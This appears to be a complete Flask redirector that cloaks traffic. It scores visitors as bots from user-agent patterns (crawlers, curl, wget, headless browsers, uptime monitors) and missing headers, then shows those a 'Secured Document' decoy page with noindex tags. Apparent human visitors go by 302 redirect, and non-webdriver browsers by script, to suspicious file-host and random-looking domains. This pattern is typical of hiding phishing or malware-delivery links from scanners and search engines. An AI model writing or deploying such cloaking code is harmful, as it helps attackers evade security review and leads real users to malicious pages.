from flask import Flask, request, redirect, render_template_string
import os

app = Flask(__name__)

# Your bot detection function
def detect_bot(request_headers):
    headers = request_headers
    user_agent = headers.get('user-agent', '')
    referer = headers.get('referer', '')
    accept_language = headers.get('accept-language', '')
    
    # Bot patterns
    bot_patterns = [
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
        'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot',
        'ahrefs', 'semrush', 'mj12bot', 'dotbot', 'blexbot', 'bingpreview',
        'rogerbot', 'exabot', 'archive.org_bot', 'gigabot', 'ia_archiver',
        'scrapy', 'python-requests', 'python-urllib', 'curl', 'wget',
        'java', 'perl', 'ruby', 'php', 'httpclient', 'axios', 'node-fetch',
        'headless', 'phantomjs', 'puppeteer', 'selenium', 'chrome-headless',
        'headlesschrome', 'headless-browser',
        'bot', 'crawler', 'spider', 'scraper', 'crawling', 'scraping',
        'postman', 'insomnia', 'jmeter', 'loadrunner', 'pagespeed',
        'pingdom', 'uptimerobot', 'newrelic', 'datadog', 'zabbix',
        'nagios', 'prtg', 'site24x7', 'statuscake'
    ]
    
    ua_lower = user_agent.lower()
    is_bot = any(pattern in ua_lower for pattern in bot_patterns)
    
    has_no_referer = not referer or referer == '' or referer == 'null' or referer == 'undefined'
    has_no_accept_language = not accept_language or accept_language == ''
    has_generic_accept_language = accept_language and '*' in accept_language
    is_headless = ('headless' in ua_lower or 'phantom' in ua_lower or 'puppeteer' in ua_lower)
    missing_headers = (not headers.get('accept') or not headers.get('accept-encoding') or not headers.get('connection'))
    
    bot_score = 0
    if is_bot: bot_score += 5
    if has_no_referer: bot_score += 3
    if has_no_accept_language: bot_score += 2
    if has_generic_accept_language: bot_score += 1
    if is_headless: bot_score += 4
    if missing_headers: bot_score += 2
    
    return bot_score >= 5

@app.route('/')
def index():
    if detect_bot(request.headers):
        # Serve decoy page
        return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8">
          <title>Secured Document - Coming Soon</title>
          <meta name="robots" content="noindex, nofollow">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
              min-height: 100vh;
              display: flex;
              align-items: center;
              justify-content: center;
              text-align: center;
              color: white;
              padding: 20px;
            }
            .container {
              max-width: 600px;
              padding: 40px;
              background: rgba(255, 255, 255, 0.1);
              backdrop-filter: blur(10px);
              border-radius: 20px;
              box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            }
            h1 { font-size: 2.5em; margin-bottom: 20px; }
            p { font-size: 1.2em; opacity: 0.9; margin-bottom: 30px; }
            .loader {
              border: 3px solid rgba(255,255,255,0.3);
              border-top: 3px solid white;
              border-radius: 50%;
              width: 50px;
              height: 50px;
              animation: spin 1s linear infinite;
              margin: 20px auto;
            }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>Secured Document</h1>
            <p>Please wait while we prepare your experience...</p>
            <div class="loader"></div>
          </div>
          
          <script>
            setTimeout(function() {
              if (navigator && navigator.userAgent && !navigator.webdriver) {
                window.location.replace('https://procom-zmrrw2raa.treksim.org');
              } else {
                document.body.innerHTML += '<p style="color:red">Please enable JavaScript and use a modern browser.</p>';
              }
            }, 2000);
          </script>
          
          <noscript>
            <meta http-equiv="refresh" content="3;url=https://api-xlnj6f0nr.qantrivomelaxis.ink">
          </noscript>
        </body>
        </html>
        """)
    else:
        # Redirect legitimate traffic
        return redirect('https://files-121archive-2nsupload.com/p7mbbm3', code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))